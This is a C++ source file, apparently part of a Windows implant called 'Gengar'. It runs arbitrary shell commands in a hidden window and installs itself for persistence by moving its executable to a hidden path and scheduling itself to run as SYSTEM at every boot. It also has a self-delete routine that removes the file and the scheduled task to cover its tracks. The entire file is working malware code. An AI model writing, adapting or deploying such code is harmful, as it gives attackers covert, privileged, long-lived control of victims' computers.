#include <boost/process.hpp>
#include <boost/process/windows.hpp>
#include "machine.h"
#include "config.h"
#include "utils.h"

Machine::Machine() { Persist(); }

std::string Machine::RunShellCommand(std::string cmd)
{
	std::string output;
	bp::ipstream out_stream, err_stream;

	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream, bp::windows::create_no_window);
	ReadStream(out_stream, output);
	ReadStream(err_stream, output);
	return output;
}

void Machine::Persist()
{
	MoveGengarToHiddenPath();
	ScheduleGengarOnBoot();
}

void Machine::Suicide()
{
	DeleteGengar();
	DeleteGengarSchedule();
	std::exit(EXIT_SUCCESS);
}

void Machine::MoveGengarToHiddenPath() { MoveFileA(GetGengarPath().c_str(), GENGAR_PATH); }

void Machine::ScheduleGengarOnBoot()
{
	RunShellCommand("schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " + quotify(TASK_NAME) + " /TR " + quotify(GENGAR_PATH));
}

void Machine::DeleteGengar() { DeleteFileA(GENGAR_PATH); }

void Machine::DeleteGengarSchedule() { RunShellCommand("schtasks /Delete /F /TN " + quotify(TASK_NAME)); }
